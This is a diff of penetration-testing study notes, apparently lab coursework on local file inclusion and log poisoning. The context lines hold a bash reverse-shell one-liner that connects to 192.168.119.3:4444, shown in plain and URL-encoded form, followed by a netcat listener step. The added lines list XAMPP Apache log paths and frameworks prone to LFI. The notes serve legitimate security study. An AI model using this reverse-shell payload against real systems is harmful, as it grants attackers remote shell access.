@@ -1094,7 +1094,7 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
 ```
 ##### (5) netcat listene & send request
-- send request
+- send request\
 ![image](https://hackmd.io/_uploads/B1_QFYuzJl.png)
 
 - netcat listener
@@ -1114,3 +1114,15 @@ img
 index.php
 js
 ```
+####  Log Poisoning on Windows
+XAMPP:\
+Apache logs: `C:\xampp\apache\logs\`
+
+>[!Note]
+>LFI and RFI vulnerabilities:\
+>other frameworks or server-side scripting languages including `Perl`, `Active Server Pages Extended`, `Active Server Pages`, and `Java Server Pages`.
+
+>[!Important]
+> 1. LFI vulnerability in a `JSP web application`
+> 2. LFI vulnerabilities in modern back-end JavaScript runtime environments like `Node.js`.
+
